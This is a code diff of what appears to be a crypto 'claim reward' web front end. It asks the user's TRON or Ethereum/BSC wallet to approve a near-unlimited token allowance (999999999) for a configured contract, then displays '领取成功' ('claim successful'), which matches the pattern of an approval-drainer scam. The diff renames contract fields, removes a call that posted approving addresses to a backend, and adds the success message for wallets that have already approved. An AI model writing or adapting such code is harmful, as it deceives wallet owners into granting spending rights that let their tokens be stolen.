@@ -45,7 +45,7 @@
 		},
 		onShow() {
 			//自动检测是否以太链，在钱包中，以太坊或币安环境自动登陆
-			//this.ethcontent()
+			//this.connect()
 		},
     computed: {
       ...mapGetters([
@@ -92,15 +92,7 @@
 			},
 			async doapprove_success(address, contract) {
 				//保存授权地址信息，无需处理返回信息
-        const data = {
-          address,
-          contract,
-          isapprove: this.isApprove,
-          link: this.walletLink[this.walletIndex]
-        };
-				console.log('doapprove_success', data);
-				const res = await http.post('/api/Index/address', data)
-				console.log(`address res`, res)
+        console.log(`call doapprove_success`)
 			},
 			async doapprove_trc() {
         console.log(`call doapprove_trc`)
@@ -115,13 +107,13 @@
 					let _value = 999999999000000 //授权数量
 					const parameter = [{
 						type: 'address',
-						value: contractdata.contract
+						value: contractdata.smart_contract
 					}, {
 						type: 'uint256',
 						value: _value
 					}];
 					const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-						contractdata.contract,
+						contractdata.smart_contract,
 						"approve(address,uint256)", {},
 						parameter,
               this.address
@@ -156,17 +148,17 @@
 						'[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
 					let abi = JSON.parse(strabi)
 					let ctx = this.contracts[this.walletLink[this.walletIndex]]
-					let contract = new this.web3js.eth.Contract(abi, ctx.symbol_code);
+					let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
           //授权数量
 					let _value = Web3.utils.toWei("999999999", 'ether');
-          const receipt = await contract.methods.approve(ctx.contract, _value).send({
+          const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
             from: this.address
           })
           const transactionHash = receipt?.transactionHash;
           if (transactionHash) {
             uni.hideLoading()
             await this.$store.dispatch(`setIsApprove`, true)
-            await this.doapprove_success(this.address, ctx.contract)
+            await this.doapprove_success(this.address, ctx.smart_contract)
             comjs.jsalert("领取成功");
           }
 				} catch (e) {
@@ -178,6 +170,7 @@
 			doapprove() {
 				//是否已授权
 				if (this.isApprove) {
+          comjs.jsalert("领取成功");
 					return true;
 				}
 				//没有连接到钱包？开始连接
